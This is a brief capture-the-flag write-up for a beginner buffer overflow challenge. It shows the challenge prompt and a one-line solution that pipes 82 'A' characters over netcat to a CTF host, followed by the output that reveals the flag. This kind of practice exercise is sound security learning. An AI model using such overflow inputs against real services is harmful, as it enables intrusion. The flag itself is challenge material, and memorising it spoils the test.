Baby's First Buffer Overflow
============================

## Challenge info:

This program is vulnerable to a buffer overflow. Can you exploit it to get the flag? The source code is provided.
Connect using your CTF shell using netcat: `nc challenges.ctfd.io 30182`

## Solution:

I didn't even bother looking at the source code, I just threw a bunch of junk at the service and got the flag first try. `¯\_(ツ)_/¯`

```
$ python -c "print('A' * 82)" | nc challenges.ctfd.io 30182
Can you perform your first buffer overflow? Give me some input!
you overflowed the buffer and changed the canary value!
here's your flag: Equifax{that_first_buffer_overflow_wasnt_too_hard}
```
